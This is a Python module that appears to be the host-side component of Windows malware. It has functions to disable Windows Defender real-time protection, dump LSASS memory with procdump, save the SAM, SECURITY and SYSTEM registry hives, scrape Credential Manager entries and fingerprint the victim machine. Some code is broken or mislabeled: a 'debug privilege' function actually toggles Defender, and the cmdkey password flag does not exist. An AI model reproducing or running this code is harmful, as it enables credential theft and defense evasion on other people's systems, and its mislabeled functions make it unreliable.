import subprocess
import json
import pip
import os


try:
    import ctypes
except:
    pip.main(['install', 'ctypes'])
    import ctypes

try:
    import psutil
except:
    pip.main(['install', 'psutil'])
    import psutil


def getWindowsCredentials():
    """
    Returns a list of dictionaries containing the credentials stored in the Windows Credential Manager.
    """

    # Create a list to store the credentials
    credentials = []

    # Run the command to get the credentials
    try:
        output = subprocess.check_output(
            "cmdkey /list", shell=True).decode("utf-8")
    except:
        return credentials

    print(output)

    # Split the output into lines
    output = output.split("\n")

    # Loop over the lines
    for line in output:
        # Check if the line contains a credential
        if "Target:" in line:
            # Get the credential name
            credential = line.split(": ")[1]

            # Get the credential type
            credentialType = credential.split(" ")[0]

            # Get the credential name
            credentialName = credential[len(credentialType) + 1:]

            # Get the credential value
            credentialValue = subprocess.check_output(
                "cmdkey /generic:" + credentialName + " /pass", shell=True).decode("utf-8").split("\n")[0]

            # Create a dictionary for the credential
            credential = {
                "type": credentialType,
                "name": credentialName,
                "value": credentialValue
            }

            # Add the credential to the list
            credentials.append(credential)

    # Return the credentials
    return credentials


def disableRealtimeDefender():
    """
    Disables Windows Defender Realtime Protection.
    """

    # Run the command to disable Windows Defender Realtime Protection
    try:
        # Command: Set-MpPreference -DisableRealtimeMonitoring $true
        # Check if we are running as admin
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return "Failed to disable antivirus, please run as admin."

        subprocess.check_output(
            "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true", shell=True).decode("utf-8")

        return "Windows Defender Realtime Protection has been disabled."
    except:
        return "Something went wrong..."


def isTamperProtected():
    """
    Checks if Windows Defender is tamper protected.
    """

    # Run the command to check if Windows Defender is tamper protected
    try:
        output = subprocess.check_output(
            "powershell.exe Get-MpComputerStatus", shell=True).decode("utf-8")

        # Check if the output contains "TamperProtectionEnabled : True"
        if "TamperProtectionEnabled : True" in output:
            return True
        else:
            return False
    except:
        return "Something went wrong..."


def enableRealtimeDefender():
    """
    Enables Windows Defender Realtime Protection.
    """

    # Run the command to disable Windows Defender Realtime Protection
    try:
        # Command: Set-MpPreference -DisableRealtimeMonitoring $false
        # Check if we are running as admin
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return "Failed to enable antivirus, please run as admin."

        subprocess.check_output(
            "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false", shell=True).decode("utf-8")

        return "Windows Defender Realtime Protection has been enabled."
    except:
        return "Something went wrong..."


def enableDebugPrivilege():
    """
    Enable the SeDebugPrivilege.
    """

    # Run the command to enable SeDebugPrivilege
    try:
        # Command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v DisablePagingExecutive /t REG_DWORD /d 0x1 /f
        # Check if we are running as admin
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return "Failed to enable SeDebugPrivilege, please run as admin."

        subprocess.check_output(
            "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $false", shell=True).decode("utf-8")

        return "SeDebugPrivilege has been enabled."
    except:
        return "Something went wrong..."


def dumpLsass(file_name="lsass.dmp"):
    # Use procdump to dump lsass.exe
    # Check if admin
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return "Failed to dump Windows passwords, please run as admin."

    cmd = "procdump64.exe -accepteula -ma lsass.exe " + file_name
    # Run the cmd, however close it once it's done.
    try:
        subprocess.Popen(cmd, shell=True).wait()
    except:
        return "Failed to dump Windows passwords, please run as admin."
    # Close it.
    return "Windows passwords have been dumped."


def dumpSamDatabase(file_name="sam"):
    # Use reg to dump the SAM database
    # Check if admin
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return "Failed to dump Windows passwords, please run as admin."

    cmd = "reg save HKLM\SAM " + file_name
    # Run the cmd, however close it once it's done.
    try:
        subprocess.Popen(cmd, shell=True).wait()
    except:
        return "Failed to dump Windows passwords, please run as admin."
    # Close it.
    return "Windows passwords have been dumped."


def dumpSecurityDatabase(file_name="security"):
    # Use reg to dump the Security database
    # Check if admin
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return "Failed to dump Windows passwords, please run as admin."

    cmd = "reg save HKLM\SECURITY " + file_name
    # Run the cmd, however close it once it's done.
    try:
        subprocess.Popen(cmd, shell=True).wait()
    except:
        return "Failed to dump Windows passwords, please run as admin."
    # Close it.
    return "Windows passwords have been dumped."


def dumpSystemDatabase(file_name="system"):
    # Use reg to dump the System database
    # Check if admin
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return "Failed to dump Windows passwords, please run as admin."

    cmd = "reg save HKLM\SYSTEM " + file_name
    # Run the cmd, however close it once it's done.
    try:
        subprocess.Popen(cmd, shell=True).wait()
    except:
        return "Failed to dump Windows passwords, please run as admin."
    # Close it.
    return "Windows passwords have been dumped."

# https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps


def getComputerInformation():
    information = {}

    # Get the computer name
    information["name"] = os.environ["COMPUTERNAME"]
    information["username"] = os.environ["USERNAME"]
    information["domain"] = os.environ["USERDOMAIN"]
    information["os"] = os.name

    # Users
    information["logged_in_users"] = [user.name for user in psutil.users()]

    # Antivirus
    information["antivirus"] = {}
    information["antivirus"]["windows_defender"] = {}

    # Subprocess to get the antivirus status
    # try:
    #     winDefenderStatus = json.loads(subprocess.check_output(
    #         ["powershell.exe", "Get-MpComputerStatus | ConvertTo-Json"]).decode("utf-8"))
    # except:
    #     winDefenderStatus = {"error": "Something went wrong..."}

    # try:
    #     winDefenderDetections = json.loads(subprocess.check_output(
    #         ["powershell.exe", "Get-MpThreatDetection | ConvertTo-Json"]).decode("utf-8"))
    # except:
    #     winDefenderDetections = {"error": "Something went wrong..."}

    # information["antivirus"]["windows_defender"]["status"] = winDefenderStatus
    # information["antivirus"]["windows_defender"]["detections"] = winDefenderDetections

    # Windows Defender status
    information["antivirus"]["windows_defender"]["tamper_protected"] = isTamperProtected()
    information["antivirus"]["windows_defender"]["realtime_protection"] = psutil.win_service_get(
        "WinDefend").status() == "running"

    # PSUtil Information
    # Disk
    information["disk"] = {}
    partitions = psutil.disk_partitions(all=False)
    for partition in partitions:
        partition_info = psutil.disk_usage(partition.device)
        information["disk"][partition.device] = {
            "total": partition_info.total,
            "used": partition_info.used,
            "free": partition_info.free,
            "percent": partition_info.percent
        }

    # CPU
    information["cpu"] = {}
    information["cpu"]["cores"] = psutil.cpu_count(logical=False)
    information["cpu"]["threads"] = psutil.cpu_count(logical=True)
    information["cpu"]["usage_percent"] = psutil.cpu_percent(
        interval=1, percpu=True)

    # Memory
    information["memory"] = {}
    memory_info = psutil.virtual_memory()
    information["memory"]["total"] = memory_info.total
    information["memory"]["available"] = memory_info.available
    information["memory"]["used"] = memory_info.used
    information["memory"]["percent"] = memory_info.percent

    # Network
    information["network"] = {}
    network_info = psutil.net_io_counters()
    information["network"]["bytes_sent"] = network_info.bytes_sent
    information["network"]["bytes_recv"] = network_info.bytes_recv

    # Processes
    information["processes"] = []
    for process in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
        information["processes"].append({
            "pid": process.info['pid'],
            "name": process.info['name'],
            "cpu_percent": process.info['cpu_percent'],
            "memory_percent": process.info['memory_percent']
        })

    # Boot time
    information["boot_time"] = psutil.boot_time()

    return information

# Function to check if Windows Defender is tamper protected (you can implement this function)


def isTamperProtected():
    return psutil.win_service_get("WinDefend").status() == "running"
